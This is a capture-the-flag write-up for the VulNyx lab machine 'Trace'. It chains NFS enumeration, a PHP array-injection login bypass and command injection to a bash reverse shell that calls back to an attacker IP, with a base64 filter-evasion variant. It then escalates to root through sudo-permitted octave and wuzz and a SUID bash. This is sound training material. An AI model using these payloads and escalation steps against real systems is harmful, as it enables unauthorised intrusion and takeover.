# [VulNyx](https://vulnyx.com/): Trace Writeup

<img width="841" height="436" alt="image" src="https://github.com/user-attachments/assets/c9eecc08-a686-4cf6-b279-d1be1cfb9c7c" />

---

# 🎯 Target Information

- **Platform:** VulNyx
- **Machine:** Trace
- **Target IP:** `192.168.1.48`

---

# 🔎 Enumeration

First and foremost, let's scan the entire target for open TCP ports using Nmap.

```bash
nmap -n -Pn -sVC -p- 192.168.1.48
```

The scan returned several interesting open ports:

```text
$ nmap -n -Pn -sVC -p- 192.168.1.48
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-28 04:39 -0700
Nmap scan report for 192.168.1.48
Host is up (0.0021s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp    open  http     Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40463/tcp6  mountd
|   100005  1,2,3      54871/udp   mountd
|   100005  1,2,3      59121/tcp   mountd
|   100005  1,2,3      60037/udp6  mountd
|   100021  1,3,4      38049/tcp6  nlockmgr
|   100021  1,3,4      39007/tcp   nlockmgr
|   100021  1,3,4      51373/udp6  nlockmgr
|   100021  1,3,4      51446/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
39007/tcp open  nlockmgr 1-4 (RPC #100021)
51451/tcp open  mountd   1-3 (RPC #100005)
58321/tcp open  mountd   1-3 (RPC #100005)
59121/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 00:0C:29:75:25:A2 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
```

We can see that ports `22`, `80`, `111`, `2049`, `39007`, `51451`, `58321`, and `59121` are open.

Port `22` is running SSH, port `80` is hosting Apache, and the presence of `rpcbind`, `NFS`, `mountd`, and `nlockmgr` suggests that the target may be exposing a network filesystem.

---

# 📂 NFS Enumeration

Now let's check what folders the target is sharing over the network and see if they can be mounted.

```bash
showmount -e 192.168.1.48
```

The target returns:

```text
$ showmount -e 192.168.1.48

Export list for 192.168.1.48:
/var/www/html *
```

We can see that the target is exposing the `/var/www/html` directory.

So, let's create a directory where we can mount the NFS share.

```bash
sudo mkdir -p /mnt/Trace_mnt
```

Now let's mount the NFS share to this directory.

```bash
sudo mount -t nfs 192.168.1.48:/var/www/html /mnt/Trace_mnt -o nolock
```

The NFS share has been successfully mounted. Let's move into the mounted directory and inspect its contents.

```bash
cd /mnt/Trace_mnt/ && ls -la
```

The output is:

```text
$ ls -la
total 24
drwxrwxrwx 3 www-data www-data  4096 Jun 13  2023 .
drwxr-xr-x 5 root     root      4096 Aug 28 05:20 ..
drwx------ 2 www-data www-data  4096 Jun 13  2023 7828d2f51ceb3aefbd12aa383ec9d5e9
-rw------- 1 www-data www-data 10701 Jun 12  2023 index.html
```

The directory containing the interesting file is owned by `www-data`, so let's switch to the `www-data` user.

```bash
sudo su -s /bin/bash www-data
```

Now let's verify our current user:

```bash
www-data@arc:/mnt/Trace_mnt$ whoami
www-data
www-data@arc:/mnt/Trace_mnt$
```

As we are now operating as `www-data`, let's read the contents of the interesting file.

```bash
cat 7828d2f51ceb3aefbd12aa383ec9d5e9/index.html
```

The file contains:

```html
<h2>Hi</h2>

<script>
    window.location.href = "http://staffserve.nyx";
</script>
```

The file discloses a new domain:

```text
staffserve.nyx
```

Let's add the domain to our `/etc/hosts` file.

```bash
sudo echo '192.168.1.48    staffserve.nyx' | tee -a /etc/hosts
```

---

# 🌐 Subdomain Enumeration

Now let's fuzz for subdomains of the domain we discovered earlier using `ffuf`.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://staffserve.nyx/ -H "Host: FUZZ.staffserve.nyx" -fs 10701
```

The scan returns:

```text
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://staffserve.nyx/ -H "Host: FUZZ.staffserve.nyx" -fs 10701

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://staffserve.nyx/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.staffserve.nyx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10701
________________________________________________

admin3                  [Status: 200, Size: 434, Words: 72, Lines: 21, Duration: 1626ms]
:: Progress: [5000/5000] :: Job [1/1] :: 119 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

We have discovered a subdomain: `admin3.staffserve.nyx`

Let's add it to `/etc/hosts`.

```bash
echo "192.168.1.48  admin3.staffserve.nyx" | sudo tee -a /etc/hosts
```

Opening the `admin3.staffserve.nyx` in the browser.

<img width="1100" height="372" alt="Screenshot_2026-08-28_05_49_48" src="https://github.com/user-attachments/assets/5d5870eb-1255-4e4b-ace4-08f0b72497eb" />

Shows a login page prompting:
```text
Please enter your credentials:
```

---

# 🔐 Login Request Analysis

Let's fire up Burp Suite and capture the login request.

```http
POST /random.php HTTP/1.1
Host: admin3.staffserve.nyx
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://admin3.staffserve.nyx
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://admin3.staffserve.nyx/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

login=admin&password=password
```

Since the application is using PHP, an interesting possibility here is **PHP Type Juggling / Array Injection**.

Reference: [HackTricks](https://hacktricks.wiki/en/pentesting-web/login-bypass/index.html)

Instead of sending the parameters as normal strings, let's try converting them into arrays by adding `[]` after the parameter names.

The modified request is:

```http
POST /random.php HTTP/1.1
Host: admin3.staffserve.nyx
Content-Length: 33
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://admin3.staffserve.nyx
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://admin3.staffserve.nyx/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

login[]=admin&password[]=password
```

Let's send the modified request.

The application responds with:

<img width="1145" height="423" alt="Screenshot_2026-08-28_06_20_53" src="https://github.com/user-attachments/assets/1ae8ee96-e194-469a-9c44-e7e353bf7b49" />

Interesting: the response discloses another domain:

```text
networkteste.nyx
```

Let's add this domain to `/etc/hosts`.

```bash
echo "192.168.1.48  networkteste.nyx" | sudo tee -a /etc/hosts
```

Navigating to the domain shows the default Apache page.

---

# 🌐 Further Subdomain Enumeration

Since the new domain does not reveal anything useful directly, let's fuzz for its subdomains using `ffuf`.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://networkteste.nyx/ -H "Host: FUZZ.networkteste.nyx" -fs 10701
```

The scan returns:

```text
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://networkteste.nyx/ -H "Host: FUZZ.networkteste.nyx" -fs 10701

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://networkteste.nyx/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.networkteste.nyx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10701
________________________________________________

ping                    [Status: 200, Size: 200, Words: 17, Lines: 8, Duration: 6ms]
:: Progress: [5000/5000] :: Job [1/1] :: 84 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

We have discovered another subdomain: `ping.networkteste.nyx`

Let's add it to `/etc/hosts`.

```bash
echo "192.168.1.48  ping.networkteste.nyx" | sudo tee -a /etc/hosts
```

Opening the site shows a form asking: `Check connectivity of an IP:`

When a local IP address is entered, the application performs a ping against the supplied address.

<img width="1293" height="423" alt="Screenshot_2026-08-28_06_30_33" src="https://github.com/user-attachments/assets/2433028a-e71c-464b-9374-ced4fb73e56d" />

Because user-controlled input is being passed to a network utility, command injection is worth testing.

Let's try:

```text
127.0.0.1 | whoami
```

The response is:

<img width="986" height="384" alt="Screenshot_2026-08-28_06_33_11" src="https://github.com/user-attachments/assets/fd16a7dd-98b9-4b37-9008-ed514dcb3e96" />

This confirms that the input is being executed by the server and indicates the presence of a **Command Injection** vulnerability.

---

# 💻 Command Injection

Now that command execution is confirmed, let's attempt to obtain a reverse shell.

First, start a listener on the attacking machine:

```bash
nc -lnvp 443
```

A direct Bash reverse-shell payload is:

```bash
127.0.0.1 | "bash -c 'bash -i > /dev/tcp/192.168.1.28/443 0>&1'"
```

However, the application responds with:

<img width="1298" height="449" alt="Screenshot_2026-08-28_06_52_27" src="https://github.com/user-attachments/assets/1189e68a-1369-40e0-a162-f154bd7d8300" />

So the straightforward payload is being detected.

After trying different approaches, a Base64-encoded command can be used to avoid directly exposing the reverse-shell syntax to the filter.

Convert the reverse-shell payload to base64
```
base64 "bash -c 'bash -i > /dev/tcp/192.168.1.28/443 0>&1'"
```

Use that Encoded hash in the payload.

```bash
|echo "YmFzaCAtYyAnYmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguMS4yOC80NDMgMD4mMScK" | base64 -d |b''a''s''h
```

Here : In Bash, `''` is an empty single-quoted string, so `b''a''s''h` is parsed by concatenating `b + '' + a + '' + s + '' + h`, resulting in bash.

This time, the reverse shell connects successfully.

On the attacking machine:

```text
nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.1.28] from (UNKNOWN) [192.168.1.48] 60624
id ; whoami
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

We now have a shell as `www-data`.

---

# 🖥️ Upgrade the Reverse Shell

The obtained reverse shell is not fully interactive, so let's upgrade it to a proper TTY.

```bash
script /dev/null -c bash
```

Press: `Ctrl + Z`

Then run:

```bash
stty raw -echo; fg
```

Next:

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

The reverse shell is now upgraded to an interactive TTY.

---

# 👥 User Enumeration

Now let's see which users exist on the machine.

```bash
cat /etc/passwd | grep sh
```

The output shows:

```text
www-data@trace:/var/www/site2$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
yan:x:1000:1000:yan,,,:/home/yan:/bin/bash
nel:x:1001:1001::/home/nel:/bin/bash
www-data@trace:/var/www/site2$
```

We can see two interesting local users: `yan` and `nel`

Let's continue by examining the web server directories.

---

# 📂 Web Directory Enumeration

There are two directories under `/var/www/`.

Let's inspect `site1`:

```text
www-data@trace:/var/www/site2$ cd /var/www/site1 && ls -la
total 16
drwx------ 2 www-data www-data 4096 Jun 13  2023 .
drwxr-xr-x 5 www-data www-data 4096 Jun 13  2023 ..
-rw-r--r-- 1 www-data www-data  434 Jun 13  2023 index.php
-rw-r--r-- 1 www-data www-data  427 Jun 13  2023 random.php
www-data@trace:/var/www/site1$ 
```

There are two PHP files. `random.php` is particularly interesting because it handled the login request earlier.

Let's read it:

```bash
cat random.php
```

The file contains:

```php
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
  </head>
  <body>

<?php
  if(!strcmp($_POST['login'], "admin") && !strcmp($_POST['password'], "m3g4S3cuR3p4zzW0rd"))
  {
?>

<h1>Site Under Maintenance</h1>
<br>
<p>For network tests you can use the domain: <strong>networkteste.nyx</strong></p>
<br>
<br>
<br>
</p>

<?php
    }
    else
    {
        echo '<p>Invalid Credentials</p>';
    }
?>

  </body>
</html>
```

We can see that a password is hardcoded in the source:

```text
m3g4S3cuR3p4zzW0rd
```

Let's determine whether this password belongs to one of the local users.

---

# 👤 Switching to Yan

Try the discovered password with the `yan` account:

```bash
su yan
```

Enter:

```text
m3g4S3cuR3p4zzW0rd
```

The switch succeeds.

Let's verify:

```text
www-data@trace:/var/www/site1$ su yan
Password: 
yan@trace:/var/www/site1$ whoami
yan
yan@trace:/var/www/site1$ 
```

So the password belongs to the `yan` user.

Because SSH is exposed on port `22`, let's use these credentials to obtain a proper SSH session.

---

# 🖥️ SSH Access as Yan

```bash
ssh yan@192.168.1.48
```

After entering the password, the SSH login succeeds.

Verify our privileges:

```text
$ ssh yan@192.168.1.48
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
yan@192.168.1.48's password: 
yan@trace:~$ id; whoami
uid=1000(yan) gid=1000(yan) grupos=1000(yan)
yan
yan@trace:~$ 
```

We now have SSH access as `yan`.

---

# 🏁 User Flag

The user flag is located in the home directory.

```bash
cat user.txt
```

```text
yan@trace:~$ cat user.txt 
3c634be72443947fbab304de01913091
yan@trace:~$ 
```

With the user flag obtained, let's continue with privilege escalation.

---

# 🔍 Sudo Enumeration

Let's check which commands `yan` can run using `sudo`.

```bash
sudo -l
```

The important entry is:

```text
yan@trace:~$ sudo -l
Matching Defaults entries for yan on trace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User yan may run the following commands on trace:
    (nel) NOPASSWD: /usr/bin/octave
yan@trace:~$ 
```

This means `yan` can execute `/usr/bin/octave` as the `nel` user without entering a password.

`**Octave**` is a high-level, open-source programming language primarily designed for numerical computations, matrix manipulation, and data visualization.

Since Octave provides functionality for executing system commands, it may allow us to obtain a shell as `nel`.

Reference: [GTFOBins.org](https://gtfobins.org/gtfobins/octave/#shell)

<img width="1622" height="694" alt="Screenshot 2026-08-29 003716" src="https://github.com/user-attachments/assets/bf7b2d75-fe37-4032-83ef-9d26d47ce837" />

Let's try it:

```bash
sudo -u nel /usr/bin/octave --eval 'system("/bin/sh")'
```

The command produces:

```text
yan@trace:~$ sudo -u nel /usr/bin/octave --eval 'system("/bin/sh")'
octave: X11 DISPLAY environment variable not set
octave: disabling GUI features
$ id ; whoami   
uid=1001(nel) gid=1001(nel) grupos=1001(nel)
nel
```

We have successfully escalated from `yan` to `nel`.

---

# 🔎 Sudo Enumeration as Nel

Now let's check the sudo permissions available to `nel`.

```bash
sudo -l
```

The important entry is:

```text
$ sudo -l
Matching Defaults entries for nel on trace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nel may run the following commands on trace:
    (root) NOPASSWD: /usr/bin/wuzz
$ 
```

We can see that `nel` can execute `/usr/bin/wuzz` as `root` without a password.

`**Wuzz**` is an interactive command-line interface for HTTP inspection and debugging.

Because we can execute it as root, let's investigate whether its interactive editor can execute commands.

---

# 💥 Privilege Escalation via Wuzz

Before attempting the escalation, let's check the current permissions of `/bin/bash`.

```bash
ls -la /bin/bash
```

The output is:

```text
$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

The SUID bit is not currently set.

Now run Wuzz as root:

```bash
sudo -u root /usr/bin/wuzz
```

The Wuzz interface opens.

<img width="1918" height="938" alt="Screenshot_2026-08-28_10_23_28" src="https://github.com/user-attachments/assets/6cffc30d-8336-4bde-abfc-b65376e22b32" />

At the top of the interface, we can see that: `F1` opens the help menu.

Press `F1` to view the available options.

<img width="1918" height="938" alt="Screenshot_2026-08-28_10_23_31" src="https://github.com/user-attachments/assets/84987687-1132-40b5-bc9a-44f95bb15568" />

The help menu shows: `Ctrl + O` for `OpenEditor`.

Let's use the editor.

Press:

```text
Ctrl + O
```

The editor opens.

<img width="1918" height="896" alt="Screenshot_2026-08-28_10_23_47" src="https://github.com/user-attachments/assets/fedabc1f-66f3-4b12-9fc3-7f64a80eacd0" />

Press `ESC` and enter:

<img width="1918" height="938" alt="Screenshot_2026-08-28_10_46_06" src="https://github.com/user-attachments/assets/c452cb48-1759-496a-98ed-e5b9e1f6b1e7" />

```bash
!bash -c "chmod u+s /bin/bash"
```
Press Enter.

Then press `ESC`, enter: `q!` to exit the OpenEditor.

and finally press:

```text
Ctrl + C
```

to exit Wuzz.

The command executed through Wuzz should have changed the permissions of `/bin/bash`.

Let's verify it.

---

# 🧪 Verify the SUID Permission

```bash
ls -la /bin/bash
```

The output is now:

```text
$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

This indicates that the SUID bit has been successfully set on `/bin/bash`.

Because the binary is owned by `root`, executing it with the `-p` option can preserve the elevated effective UID.

---

# 👑 Root Shell

Let's spawn a privileged Bash shell:

```bash
/bin/bash -p
```

Now verify our identity:

```text
$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# id ;whoami
uid=1001(nel) gid=1001(nel) euid=0(root) grupos=1001(nel)
root
bash-5.1# 
```

The effective UID is `0`, confirming that we have successfully escalated to root.

---

# 🏁 Root Flag

The root flag is located in `/root`.

```bash
cat /root/root.txt
```

```text
bash-5.1# cat /root/root.txt 
f5385b0998fbf815619dc5c73767ceef
bash-5.1# 
```

---
# 🧾 Summary

| Phase | Technique |
|---|---|
| Enumeration | Nmap |
| Network Share Enumeration | `showmount` |
| Initial Access Vector | NFS Misconfiguration |
| Information Disclosure | Exposed Web Directory |
| Domain Discovery | NFS File |
| Subdomain Enumeration | FFUF |
| Web Enumeration | Login Page |
| Authentication Bypass | PHP Array Injection / Type Juggling |
| Domain Discovery | Application Response |
| Subdomain Enumeration | FFUF |
| Initial Vulnerability | Command Injection |
| Shell | Reverse Shell |
| Shell Upgrade | Interactive TTY |
| User Enumeration | `/etc/passwd` |
| Credential Discovery | PHP Source Code |
| Lateral Movement | `www-data` → `yan` |
| Initial SSH Access | SSH as `yan` |
| User Flag | `/home/yan/user.txt` |
| Privilege Escalation | `sudo` misconfiguration |
| User Switch | `octave` → `nel` |
| Root Privilege Escalation | `wuzz` |
| Root Execution | SUID Bash |
| Root Flag | `/root/root.txt` |

---

# 🚀 Key Takeaways

- NFS exports should be restricted to trusted hosts instead of using unrestricted access such as `*`.
- Exposed web directories can reveal internal application files and infrastructure information.
- Source code should not disclose sensitive credentials.
- PHP applications should validate input types before performing authentication comparisons.
- User-controlled input passed to system commands can lead to command injection.
- Input filters based only on simple keyword matching can often be bypassed, so applications should avoid shell interpretation of untrusted input.
- Credentials discovered from application source code may allow lateral movement to local users.
- `sudo` permissions should follow the principle of least privilege.
- Allowing an unprivileged user to execute powerful interpreters such as Octave as another user can lead to privilege escalation.
- Interactive utilities such as Wuzz should not be granted unrestricted root execution when they provide command execution capabilities.
- SUID permissions on `/bin/bash` provide a direct path to an effective root shell and should never be enabled unnecessarily.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
